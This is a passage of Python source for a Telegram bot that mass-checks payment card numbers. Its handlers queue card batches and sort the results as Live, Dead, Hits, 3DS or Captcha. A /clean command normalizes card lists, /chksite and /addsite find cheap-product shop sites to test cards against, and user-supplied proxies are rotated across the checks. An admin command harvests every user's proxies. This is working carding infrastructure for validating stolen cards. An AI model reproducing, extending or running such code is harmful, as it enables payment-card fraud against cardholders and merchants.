        [InlineKeyboardButton("No", callback_data=f"mchk_captcha_pref:n:{captcha_pref_id}")]
    ])
    captcha_pref_message = await message.reply_text(
        captcha_pref_text,
        reply_markup=captcha_pref_keyboard,
        disable_web_page_preview=True
    )

    send_captcha_file = True
    try:
        await asyncio.wait_for(captcha_pref_event.wait(), timeout=45)
        captcha_choice = mchk_captcha_pref_sessions.get(captcha_pref_id, {}).get('choice', 'yes')
        send_captcha_file = captcha_choice == 'yes'
    except asyncio.TimeoutError:
        send_captcha_file = True
    finally:
        mchk_captcha_pref_sessions.pop(captcha_pref_id, None)

    try:
        await captcha_pref_message.edit_text(
            f"{captcha_pref_text}\n\n✅ Selected: {'Yes' if send_captcha_file else 'No'}",
            disable_web_page_preview=True
        )
    except Exception:
        pass
    
    batch_id = f"mchk_{user.id}_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"

    # Create progress message
    user_display_name = await get_cached_user_display_name(user.id)
    progress_text = f"""💳 <b>CARD PROCESSOR</b>
━━━━━━━━━━━━━━
📂 Total Cards: {len(accepted_cards)}
📤 Processed: 0
━━━━━━━━━━━━━━
🎯 <b>RESULTS BREAKDOWN</b>
• ✅ Live: 0
• ❌ Dead: 0
• 💎 Hits: 0
• 🔐 3DS: 0
• 🧩 Captcha: 0
• 🚫 Failed: 0
━━━━━━━━━━━━━━
⏱️ Duration: 0.0s
👤 {user_display_name}"""

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")]
    ])
    
    processing_msg = await message.reply_text(
        text=progress_text,
        reply_markup=keyboard,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Store task info
    msg_id = processing_msg.id
    task_stats[msg_id] = {
        'total': len(accepted_cards),
        'checked': 0,
        'hit': 0,
        'live': 0,
        'otp': 0,
        'captcha': 0,
        'failed': 0,
        'start_time': datetime.now(),
        'last_update_checked': 0,
        'last_update_at': 0.0,
        'batch_id': batch_id,
        'task_type': 'mchk',
        'mchk_send_captcha_file': send_captcha_file
    }
    task_messages[msg_id] = processing_msg
    task_users[msg_id] = user.id
    register_mchk_batch(user.id, batch_id, msg_id)
    
    # Add cards to fair pending queue
    queued_cards = 0
    for i, cc_parts in enumerate(accepted_cards):
        proxy = random.choice(user_proxies) if user_proxies else None
        site = random.choice(site_pool)
        task_id = f"{user.id}_{int(time.time() * 1000)}_{i}"

        queued_ok, _ = enqueue_user_task({
            'user_id': user.id,
            'cc_data': cc_parts,
            'site': site,
            'proxy': proxy,
            'message': processing_msg,
            'type': 'mchk',
            'task_id': task_id,
            'mchk_show_live_otp': send_live_otp,
            'mchk_send_captcha_file': send_captcha_file,
            'batch_id': batch_id
        })
        if not queued_ok:
            break
        queued_cards += 1
        register_queued_tasks(user.id, 1)
        if (i + 1) % 1000 == 0:
            await asyncio.sleep(0)

    if queued_cards != len(accepted_cards):
        task_stats[msg_id]['total'] = queued_cards
        dropped_for_capacity += len(accepted_cards) - queued_cards
        if queued_cards == 0:
            task_stats.pop(msg_id, None)
            task_messages.pop(msg_id, None)
            task_users.pop(msg_id, None)
            finalize_mchk_batch(batch_id)
            await processing_msg.edit_text("❌ Queue is full. Please try again shortly.", disable_web_page_preview=True)
            return
    await increment_user_checks_bulk(user.id, queued_cards)

    if invalid_cards:
        await message.reply_text(
            f"⚠️ Skipped invalid cards: {len(invalid_cards)}",
            disable_web_page_preview=True
        )
    if dropped_for_capacity:
        await message.reply_text(
            f"⚠️ Queue limit reached. Accepted: {queued_cards} | Skipped: {dropped_for_capacity}",
            disable_web_page_preview=True
        )

@app.on_message(filters.command('clean') & filters.private)
async def clean_command(client, message):
    """Clean CC lines from replied text/txt and return normalized txt."""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)

    lines = []
    tmp_file = None
    try:
        if message.reply_to_message:
            if message.reply_to_message.document:
                tmp_file = await message.reply_to_message.download()
                async with aiofiles.open(tmp_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                lines = content.splitlines()
            elif message.reply_to_message.text:
                lines = message.reply_to_message.text.splitlines()
        elif len(message.command) > 1:
            lines = ' '.join(message.command[1:]).splitlines()

        if not lines:
            await message.reply_text(
                "❌ Reply to a .txt file or text containing CCs.\nExample: 4111111111111111|12|2028|123",
                disable_web_page_preview=True
            )
            return

        cleaned = []
        seen = set()
        invalid = 0
        for line in lines:
            normalized = parse_cc_from_any_line(line)
            if not normalized:
                invalid += 1
                continue
            if normalized in seen:
                continue
            seen.add(normalized)
            cleaned.append(normalized)

        if not cleaned:
            await message.reply_text("❌ No valid CC lines found to clean.", disable_web_page_preview=True)
            return

        output_file = f"cleaned_ccs_{user.id}_{int(time.time())}.txt"
        async with aiofiles.open(output_file, 'w') as f:
            await f.write('\n'.join(cleaned))

        await message.reply_document(
            output_file,
            caption=f"✅ Clean complete\nValid: {len(cleaned)}\nInvalid: {invalid}\nDuplicates removed: {max(0, len(lines)-len(cleaned)-invalid)}"
        )
        os.remove(output_file)
    finally:
        if tmp_file and os.path.exists(tmp_file):
            os.remove(tmp_file)

@app.on_message(filters.command('stopmchk') & filters.private)
async def stopmchk_command(client, message):
    """Stop all active mass-check batches for user."""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)

    cancel_info = cancel_user_mchk_batches(user.id)
    cancelled_batches = cancel_info.get('cancelled_batches', [])
    removed_pending = cancel_info.get('removed_pending', 0)
    msg_ids = set(cancel_info.get('msg_ids', []))

    if not cancelled_batches:
        await message.reply_text("ℹ️ No active mass check to stop.", disable_web_page_preview=True)
        return

    for msg_id in msg_ids:
        progress_msg = task_messages.get(msg_id)
        if not progress_msg:
            continue
        stats = task_stats.get(msg_id, {})
        checked = stats.get('checked', 0)
        total = stats.get('total', 0)
        try:
            await progress_msg.edit_text(
                f"⛔ MASS CHECK STOPPED\n\nChecked: {checked}/{total}\nPending removed: {removed_pending}",
                disable_web_page_preview=True
            )
        except Exception:
            pass
        asyncio.create_task(cleanup_task_data(msg_id, delay=10))

    await message.reply_text(
        f"✅ Stopped mass check batches: {len(cancelled_batches)}\n"
        f"🗑️ Removed pending cards: {removed_pending}",
        disable_web_page_preview=True
    )

@app.on_message(filters.command('chksite') & filters.private)
async def chksite_command(client, message):
    """Test sites and find working ones"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get sites from command or reply
    sites = []
    if len(message.command) > 1:
        sites_text = ' '.join(message.command[1:])
        sites = [line.strip() for line in sites_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            # Handle file upload
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                sites = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            # Handle text reply
            sites = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not sites:
        await message.reply_text(
            "❌ Please provide sites to test (one per line)\n"
            "Example: myshop.com or https://myshop.com",
            disable_web_page_preview=True
        )
        return
    
    sites = sites
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Create progress message
    user_display_name = await get_cached_user_display_name(user.id)
    progress_text = f"""🌐 <b>SITE CHECKER</b>
━━━━━━━━━━━━━━
📂 Total Sites: {len(sites)}
📤 Processed: 0
━━━━━━━━━━━━━━
🎯 <b>RESULTS BREAKDOWN</b>
• ✅ Working Sites: 0
• ❌ Not Working Sites: 0
━━━━━━━━━━━━━━
⏱️ Duration: 0.0s
👤 {user_display_name}"""
    
    processing_msg = await message.reply_text(
        text=progress_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )
    
    # Store task info
    msg_id = processing_msg.id
    task_stats[msg_id] = {
        'total': len(sites),
        'checked': 0,
        'hit': 0,
        'live': 0,
        'otp': 0,
        'captcha': 0,
        'failed': 0,
        'start_time': datetime.now(),
        'last_update_checked': 0,
        'last_update_at': 0.0,
        'task_type': 'chksite'
    }
    task_messages[msg_id] = processing_msg
    task_users[msg_id] = user.id
    
    # Test sites with worker pool
    working_sites = []
    skipped_sites = []
    dead_sites = []
    site_check_semaphore = asyncio.Semaphore(SITE_CHECK_WORKERS)

    async def _check_site(site_to_check):
        try:
            async with site_check_semaphore:
                is_working, message_text, product_info = await test_site_connection(site_to_check, proxy)

            if is_working:
                saved, save_msg = await save_working_site(user.id, site_to_check, product_info)
                if saved:
                    return "hit", site_to_check, product_info, None
                return "skipped", site_to_check, product_info, save_msg

            return "dead", site_to_check, None, message_text
        except Exception as e:
            return "dead", site_to_check, None, str(e)

    check_tasks = [asyncio.create_task(_check_site(site)) for site in sites]
    processed_count = 0

    for done_task in asyncio.as_completed(check_tasks):
        result_type, checked_site, product_info, detail = await done_task
        processed_count += 1

        if result_type == "hit":
            working_sites.append((checked_site, product_info))
            task_stats[msg_id]['hit'] += 1
        elif result_type == "skipped":
            skipped_sites.append((checked_site, product_info, detail))
            task_stats[msg_id]['failed'] += 1
        else:
            dead_sites.append((checked_site, detail))
            task_stats[msg_id]['failed'] += 1

        # Update stats/progress
        task_stats[msg_id]['checked'] = processed_count
        is_complete = processed_count >= task_stats[msg_id]['total']
        if should_update_progress(task_stats[msg_id], force=is_complete):
            await update_task_progress(msg_id, task_stats[msg_id])
    
    # Create result file
    result_file = f"site_test_{user.id}.txt"
    async with aiofiles.open(result_file, 'w') as f:
        await f.write("=== WORKING SITES ===\n\n")
        for site, info in working_sites:
            await f.write(f"{site}\n")
            await f.write(f"  Price: ${info['price']}\n")
            await f.write(f"  Product: {info['link']}\n\n")

        await f.write("\n=== SKIPPED SITES (PRICE LIMIT) ===\n\n")
        for site, info, reason in skipped_sites:
            await f.write(f"{site}\n")
            await f.write(f"  Price: ${info.get('price', 'N/A')}\n")
            await f.write(f"  Reason: {reason}\n\n")
        
        await f.write("\n=== DEAD SITES ===\n\n")
        for site, error in dead_sites:
            await f.write(f"{site} - {error}\n")
    
    # Send results
    not_working_total = len(skipped_sites) + len(dead_sites)
    summary = f"""✅ Site Test Complete!

📊 Results:
🟢 Working Sites: {len(working_sites)}
🔴 Not Working Sites: {not_working_total}

Only sites between ${MIN_SITE_PRODUCT_PRICE:.2f} and ${MAX_SITE_PRODUCT_PRICE:.2f} are saved.
Check /showsites to see saved working sites."""
    
    await message.reply_document(
        result_file,
        caption=summary
    )
    
    os.remove(result_file)
    
    # Clean up task data
    asyncio.create_task(cleanup_task_data(msg_id))

@app.on_message(filters.command('addproxy') & filters.private)
async def addproxy_command(client, message):
    """Add proxy command"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get proxies from command or reply
    proxies = []
    if len(message.command) > 1:
        proxies_text = ' '.join(message.command[1:])
        proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                proxies = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            proxies = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not proxies:
        await message.reply_text(
            "❌ Please provide proxies (one per line)\n"
            "Format: IP:PORT or IP:PORT:USER:PASS",
            disable_web_page_preview=True
        )
        return
    
    status_msg = await message.reply_text(
        f"🔄 Validating {len(proxies)} proxies...",
        disable_web_page_preview=True
    )

    normalized_proxies = []
    invalid_proxies = []
    seen = set()
    for proxy in proxies:
        is_valid, normalized_proxy, reason = validate_proxy_format(proxy)
        if not is_valid:
            invalid_proxies.append((proxy, reason))
            continue
        if normalized_proxy in seen:
            continue
        seen.add(normalized_proxy)
        normalized_proxies.append(normalized_proxy)

    if not normalized_proxies:
        await status_msg.edit_text(
            f"❌ No valid proxies found.\n"
            f"Invalid format: {len(invalid_proxies)}",
            disable_web_page_preview=True
        )
        return

    semaphore = asyncio.Semaphore(PROXY_VALIDATION_CONCURRENCY)

    async def _validate_one(proxy_value):
        async with semaphore:
            ok, reason = await validate_proxy_connection(proxy_value)
            return proxy_value, ok, reason

    proxy_checks = await asyncio.gather(*[_validate_one(proxy_value) for proxy_value in normalized_proxies])

    added = 0
    db_failed = 0
    unreachable = []
    for proxy_value, ok, reason in proxy_checks:
        if not ok:
            unreachable.append((proxy_value, reason))
            continue
        if await add_user_proxy(user.id, proxy_value):
            added += 1
        else:
            db_failed += 1

    details = [
        "✅ Proxy validation complete!",
        f"📊 Added: {added}",
        f"❌ Invalid format: {len(invalid_proxies)}",
        f"❌ Unreachable: {len(unreachable)}",
        f"❌ DB failed: {db_failed}"
    ]
    if invalid_proxies:
        details.append(f"⚠️ Invalid sample: {invalid_proxies[0][0]} ({invalid_proxies[0][1]})")
    if unreachable:
        details.append(f"⚠️ Unreachable sample: {unreachable[0][0]} ({unreachable[0][1]})")

    await status_msg.edit_text("\n".join(details), disable_web_page_preview=True)

@app.on_message(filters.command('delproxy') & filters.private)
async def delproxy_command(client, message):
    """Delete proxy command"""
    user = message.from_user
    
    if len(message.command) > 1:
        # Delete specific proxy
        proxy = message.command[1]
        if await delete_user_proxy(user.id, proxy):
            await message.reply_text(f"✅ Proxy deleted: {proxy}", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Proxy not found", disable_web_page_preview=True)
    else:
        # Delete all proxies
        if await delete_user_proxy(user.id):
            await message.reply_text("✅ All your proxies deleted", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ No proxies found", disable_web_page_preview=True)

@app.on_message(filters.command('showproxy') & filters.private)
async def showproxy_command(client, message):
    """Show user's proxies"""
    user = message.from_user
    
    proxies = await get_user_proxies(user.id)
    
    if not proxies:
        await message.reply_text("❌ You have no saved proxies", disable_web_page_preview=True)
        return
    
    # Create proxy list text
    proxy_text = "📋 Your Proxies:\n\n"
    for i, proxy in enumerate(proxies, 1):
        proxy_text += f"{i}. {proxy}\n"
    
    # Send as file if too long
    if len(proxy_text) > 4000:
        file_path = f"proxies_{user.id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            await f.write('\n'.join(proxies))
        await message.reply_document(file_path, caption=f"📋 Your Proxies ({len(proxies)})")
        os.remove(file_path)
    else:
        await message.reply_text(proxy_text, disable_web_page_preview=True)

@app.on_message(filters.command('addsite') & filters.private)
async def addsite_command(client, message):
    """Check site and get cheapest product"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get site from command
    if len(message.command) > 1:
        site = message.command[1]
    else:
        await message.reply_text("❌ Please provide a site URL", disable_web_page_preview=True)
        return
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Send processing message
    processing_msg = await message.reply_text(f"🔄 Checking site: {site}...", disable_web_page_preview=True)
    
    # Fetch products
    info = await fetch_products(site, proxy)
    
    if isinstance(info, tuple) and info[0] is False:
        await processing_msg.edit_text(f"❌ {info[1]}", disable_web_page_preview=True)
        return
    
    # Save working site (only if cheapest product <= price limit)
    success, msg = await save_working_site(user.id, site, info)
    
    if success:
        # Format response
        response = f"""✅ Site Check Result

🌐 Site: {site}
💰 Cheapest Product: ${info['price']}
🔗 Link: {info['link']}
🆔 Variant ID: {info['variant_id']}

✅ Site added to your working sites!"""
    else:
        response = f"""✅ Site Check Result

🌐 Site: {site}
💰 Cheapest Product: ${info['price']}
🔗 Link: {info['link']}
🆔 Variant ID: {info['variant_id']}

⚠️ {msg}"""

    await processing_msg.edit_text(response, disable_web_page_preview=True)

@app.on_message(filters.command('showsites') & filters.private)
async def showsites_command(client, message):
    """Show all your working sites"""
    user = message.from_user
    
    # Get user's sites
    user_sites_doc = await get_user_sites_doc(user.id)
    
    if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
        await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
        return
    
    sites_list = user_sites_doc['sites']
    
    # Create a formatted list of sites
    sites_text = "📋 Your Working Sites:\n\n"
    total_price = 0
    price_count = 0
    
    for i, site_entry in enumerate(sites_list, 1):
        if isinstance(site_entry, dict):
            site_url = site_entry.get('url', 'Unknown')
            price = site_entry.get('price', 'N/A')
            if price != 'N/A':
                try:
                    total_price += float(price)
                    price_count += 1
                except:
                    pass
            sites_text += f"{i}. {site_url} - ${price}\n"
        else:
            sites_text += f"{i}. {site_entry}\n"
    
    if price_count > 0:
        avg_price = total_price / price_count
        sites_text += f"\n📊 Statistics:\n"
        sites_text += f"Total Sites: {len(sites_list)}\n"
        sites_text += f"Avg Price: ${avg_price:.2f}\n"
    
    sites_text += f"\nTo remove sites, use:\n"
    sites_text += "`/rmvsite` - Show removal options"
    
    # If list is too long, send as file
    if len(sites_text) > 4000:
        file_path = f"sites_{user.id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            for site_entry in sites_list:
                if isinstance(site_entry, dict):
                    await f.write(f"{site_entry.get('url', 'Unknown')} - ${site_entry.get('price', 'N/A')}\n")
                else:
                    await f.write(f"{site_entry}\n")
        await message.reply_document(
            file_path,
            caption=f"📋 Your Working Sites ({len(sites_list)} sites)"
        )
        os.remove(file_path)
    else:
        await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

@app.on_message(filters.command('rmvsite') & filters.private)
async def rmvsite_command(client, message):
    """User command: Remove your own sites"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Parse command arguments
    args = message.text.split()
    
    # Get user's sites first
    user_sites_doc = await get_user_sites_doc(user.id)
    
    if not user_sites_doc or 'sites' not in user_sites_doc or not user_sites_doc['sites']:
        await message.reply_text("❌ You don't have any saved sites yet.\nUse /addsite to add working sites first.", disable_web_page_preview=True)
        return
    
    # If no site specified, show list of sites with numbers
    if len(args) < 2:
        sites_list = user_sites_doc['sites']
        
        # Create a numbered list of sites
        sites_text = "📋 Your Working Sites:\n\n"
        for i, site_entry in enumerate(sites_list, 1):
            if isinstance(site_entry, dict):
                site_url = site_entry.get('url', 'Unknown')
                price = site_entry.get('price', 'N/A')
                sites_text += f"{i}. {site_url} (${price})\n"
            else:
                sites_text += f"{i}. {site_entry}\n"
        
        sites_text += f"\nTotal: {len(sites_list)} sites\n\n"
        sites_text += "**How to remove:**\n"
        sites_text += "`/rmvsite all` - Remove ALL your sites\n"
        sites_text += "`/rmvsite <number>` - Remove site by number\n"
        sites_text += "`/rmvsite <site_url>` - Remove site by URL"
        
        await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
        return
    
    # Handle different removal methods
    removal_input = args[1].lower()
    
    # Case 1: Remove all sites
    if removal_input == 'all':
        sites_list = user_sites_doc.get('sites', [])
        had_sites = bool(sites_list)
        await replace_user_sites(user.id, [])

        if had_sites:
            await message.reply_text("✅ All your working sites have been removed successfully!", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Failed to remove sites or no sites found.", disable_web_page_preview=True)
        
        return
    
    # Case 2: Remove by number
    if removal_input.isdigit():
        site_number = int(removal_input) - 1
        sites_list = user_sites_doc['sites']
        
        if 0 <= site_number < len(sites_list):
            site_to_remove = sites_list[site_number]
            
            if isinstance(site_to_remove, dict):
                site_url = site_to_remove.get('url')
                site_price = site_to_remove.get('price', 'N/A')
            else:
                site_url = site_to_remove
            
            # Remove the site
            new_sites = [s for idx, s in enumerate(sites_list) if idx != site_number]
            await replace_user_sites(user.id, new_sites)

            if len(new_sites) != len(sites_list):
                await message.reply_text(
                    f"✅ Site removed successfully!\n\n"
                    f"Removed: {site_url if isinstance(site_url, str) else 'Unknown'}\n"
                    f"Price: ${site_price if 'site_price' in locals() else 'N/A'}",
                    disable_web_page_preview=True
                )
            else:
                await message.reply_text("❌ Failed to remove site.", disable_web_page_preview=True)
        else:
            await message.reply_text(f"❌ Invalid site number. Please use a number between 1 and {len(sites_list)}", disable_web_page_preview=True)
        
        return
    
    # Case 3: Remove by URL (partial or full)
    else:
        search_term = removal_input.lower()
        sites_list = user_sites_doc['sites']
        
        # Find matching sites
        matching_sites = []
        for site_entry in sites_list:
            if isinstance(site_entry, dict):
                site_url = site_entry.get('url', '').lower()
            else:
                site_url = str(site_entry).lower()
            
            if search_term in site_url:
                matching_sites.append(site_entry)
        
        if not matching_sites:
            await message.reply_text(f"❌ No sites found matching '{removal_input}'", disable_web_page_preview=True)
            return
        
        if len(matching_sites) == 1:
            # Single match - remove it directly
            site_to_remove = matching_sites[0]

            new_sites = [s for s in sites_list if s != site_to_remove]
            await replace_user_sites(user.id, new_sites)

            if len(new_sites) != len(sites_list):
                site_name = site_to_remove.get('url', str(site_to_remove)) if isinstance(site_to_remove, dict) else str(site_to_remove)
                await message.reply_text(f"✅ Site removed: {site_name}", disable_web_page_preview=True)
            else:
                await message.reply_text("❌ Failed to remove site.", disable_web_page_preview=True)
        
        else:
            # Multiple matches - show them with numbers for selection
            sites_text = f"🔍 Found {len(matching_sites)} sites matching '{removal_input}':\n\n"
            
            for i, site_entry in enumerate(matching_sites, 1):
                if isinstance(site_entry, dict):
                    site_url = site_entry.get('url', 'Unknown')
                    price = site_entry.get('price', 'N/A')
                    sites_text += f"{i}. {site_url} (${price})\n"
                else:
                    sites_text += f"{i}. {site_entry}\n"
            
            sites_text += f"\nTo remove one, use the number:\n"
            sites_text += f"`/rmvsite {i}` (where {i} is the number above)\n"
            sites_text += f"Or use `/rmvsite all` to remove all"
            
            await message.reply_text(sites_text, parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)

@app.on_message(filters.command('stats') & filters.private)
async def stats_command(client, message):
    """Show user statistics"""
    user = message.from_user
    
    stats = await get_user_stats(user.id)
    if not stats:
        await message.reply_text("❌ No stats found", disable_web_page_preview=True)
        return
    
    # Format stats
    joined_date = stats['joined_at'].strftime("%Y-%m-%d %H:%M") if stats['joined_at'] else "Unknown"
    last_seen = stats['last_seen'].strftime("%Y-%m-%d %H:%M") if stats['last_seen'] else "Unknown"
    
    stats_text = f"""📊 Your Statistics

👤 Name: {stats['first_name']}
🆔 User ID: {stats['user_id']}
📅 Joined: {joined_date}
👀 Last Seen: {last_seen}
🔢 Total Checks: {stats['total_checks']}
🔌 Proxies: {stats['proxy_count']}
🌐 Working Sites: {stats['sites_count']}
⚡ Active Tasks: {stats['active_tasks']} (Queued: {stats['active_queued']} | Processing: {stats['active_processing']})"""

    await message.reply_text(stats_text, disable_web_page_preview=True)

# Admin commands
@app.on_message(filters.command('leechproxy'))
async def leechproxy_command(client, message):
    """Admin: Get user proxies"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get user ID from command
    target_user_id = None
    if len(message.command) > 1:
        try:
            target_user_id = int(message.command[1])
        except ValueError:
            await message.reply_text("❌ Invalid user ID", disable_web_page_preview=True)
            return
    
    if target_user_id:
        # Get specific user's proxies
        proxies = await get_user_proxies(target_user_id)
        if not proxies:
            await message.reply_text(f"❌ No proxies found for user {target_user_id}", disable_web_page_preview=True)
            return
        
        # Create file
        file_path = f"proxies_{target_user_id}.txt"
        async with aiofiles.open(file_path, 'w') as f:
            await f.write('\n'.join(proxies))
        await message.reply_document(
            file_path,
            caption=f"📋 Proxies for user {target_user_id} ({len(proxies)})"
        )
        os.remove(file_path)
    else:
        # Get all users' proxies
        all_proxies = await get_all_proxies()
        if not all_proxies:
            await message.reply_text("❌ No proxies found in database", disable_web_page_preview=True)
            return
        
        # Group by user
        user_proxies = {}
        for p in all_proxies:
            uid = p['user_id']
            if uid not in user_proxies:
                user_proxies[uid] = []
            user_proxies[uid].append(p['proxy'])
        
        # Create file with all proxies
        file_path = "all_proxies.txt"
        async with aiofiles.open(file_path, 'w') as f:
            for uid, proxies in user_proxies.items():
                await f.write(f"User: {uid} ({len(proxies)} proxies)\n")
                for proxy in proxies:
                    await f.write(f"  {proxy}\n")
                await f.write("\n")
        
        await message.reply_document(
            file_path,
            caption=f"📋 All Proxies ({len(all_proxies)} total from {len(user_proxies)} users)"
        )
        os.remove(file_path)
        
@app.on_message(filters.command('getusersite'))
async def getusersite_command(client, message):
    """Admin: Get all user working sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get all user sites
    user_sites_list = await get_all_user_site_docs()
    
    if not user_sites_list:
        await message.reply_text("❌ No user sites found", disable_web_page_preview=True)
        return
    
    # Create file with all user sites
    file_path = "user_sites.txt"
    async with aiofiles.open(file_path, 'w') as f:
        for user_sites in user_sites_list:
            uid = user_sites['user_id']
            sites = user_sites.get('sites', [])
            await f.write(f"User: {uid} ({len(sites)} sites)\n")
            for site in sites:
                if isinstance(site, dict):
                    await f.write(f"  {site['url']} - ${site.get('price', 'N/A')}\n")
                else:
                    await f.write(f"  {site}\n")
            await f.write("\n")
    
    await message.reply_document(
        file_path,
        caption=f"📋 All User Sites ({len(user_sites_list)} users)"
    )
    os.remove(file_path)


@app.on_message(filters.command('loadsite') & filters.private)
async def loadsite_command(client, message):
    """Admin: Add global sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    # Get sites from command or reply
    sites = []
    if len(message.command) > 1:
        sites_text = ' '.join(message.command[1:])
        sites = [line.strip() for line in sites_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                sites = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            sites = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not sites:
        await message.reply_text("❌ Please provide sites (one per line)", disable_web_page_preview=True)
        return
    
    # Add sites
    added = 0
    failed = 0
    messages = []
    
    for site in sites:
        success, msg = await add_global_site(site)
        if success:
            added += 1
        else:
            failed += 1
            messages.append(msg)
    
    response = f"✅ Global sites added!\n📊 Added: {added}\n❌ Failed: {failed}"
    if messages:
        response += f"\n\n⚠️ Issues:\n" + "\n".join(messages[:5])
    
    await message.reply_text(response, disable_web_page_preview=True)

@app.on_message(filters.command('delsite') & filters.private)
async def delsite_command(client, message):
    """Admin: Delete global sites"""
    user = message.from_user
    
    # Check if user is admin
    if user.id not in ADMINS:
        await message.reply_text("❌ You are not authorized to use this command", disable_web_page_preview=True)
        return
    
    if len(message.command) > 1:
        # Delete specific site
        site = message.command[1]
        if await delete_global_site(site):
            await message.reply_text(f"✅ Global site deleted: {site}", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ Site not found", disable_web_page_preview=True)
    else:
        # Delete all sites
        if await delete_global_site():
            await message.reply_text("✅ All global sites deleted", disable_web_page_preview=True)
        else:
            await message.reply_text("❌ No sites found", disable_web_page_preview=True)



# Error handler
@app.on_message()
async def error_handler(client, message):
    """Handle unknown commands"""
    if message.text and message.text.startswith('/'):
        await message.reply_text("❌ Unknown command. Use /start to see available commands.", disable_web_page_preview=True)

# Main function
async def main():
    """Main function to start the bot"""
    logger.info("Starting bot...")
    
    # Initialize database
    await init_db()

    # Start fair dispatcher
    dispatcher_task = asyncio.create_task(fair_task_dispatcher())
    
    # Start workers
    for i in range(WORKER_COUNT):
        task = asyncio.create_task(task_worker(i))
        active_workers.append(task)
    
    # Start result handler
    result_task = asyncio.create_task(result_handler())
    
    # Start bot
    await app.start()
    logger.info("Bot started successfully")
    
    # Keep running
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        logger.info("Stopping bot...")
    finally:
        # Stop dispatcher
        dispatcher_task.cancel()
        await asyncio.gather(dispatcher_task, return_exceptions=True)

        # Stop workers
        for _ in range(WORKER_COUNT):
            await TASK_QUEUE.put(None)
        
        # Wait for workers to finish
        await asyncio.gather(*active_workers, return_exceptions=True)
        
        # Stop result handler
        result_task.cancel()
        
        # Stop bot
        await app.stop()
        logger.info("Bot stopped")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")